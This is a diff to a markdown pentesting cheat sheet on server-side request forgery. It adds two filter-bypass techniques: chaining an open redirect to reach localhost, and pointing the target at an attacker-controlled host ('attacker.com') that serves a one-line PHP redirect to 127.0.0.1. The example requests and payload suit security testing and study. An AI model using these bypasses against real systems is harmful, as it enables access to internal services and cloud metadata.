@@ -91,6 +91,34 @@ Sometimes, specific IP addresses are blocked, such as 169.254.169.254. In this c
 
 > Use thsi website to convert IP address to all the 4 types of notation - https://www.abuseipdb.com/tools/ip-address-converter
 
+#### Find an openredirect
+
+If an open redirect is found, try to use that path to induce SSRF and access backend systems.
+
+```http
+POST /upload 
+Host: test.example.com
+url=http://pics.example.com/123?redirect=localhost
+```
+
+In the above request, we use the open redirect vulnerability on `pics.example.com`  domain to redirect to localhost
+
+#### Redirect by hosting a server containing malicious php content
+
+Make the server request a URL that we control & that **redirects to the blocklist address**.
+
+Ask the target server to send arequest to our server
+
+```http
+http://public.example.com/proxy?url=http://attacker.com/ssrf
+```
+
+On our server host a file with the following content,
+
+```php
+<?php header("location: http://127.0.0.1"); ?>
+```
+
 #### SSRF Wrappers / URL Schema
 
 The following wrappers are potentiall expected URL schema wrappers found within PHP environments (for some schema curl-wrappers would need to be enabled).
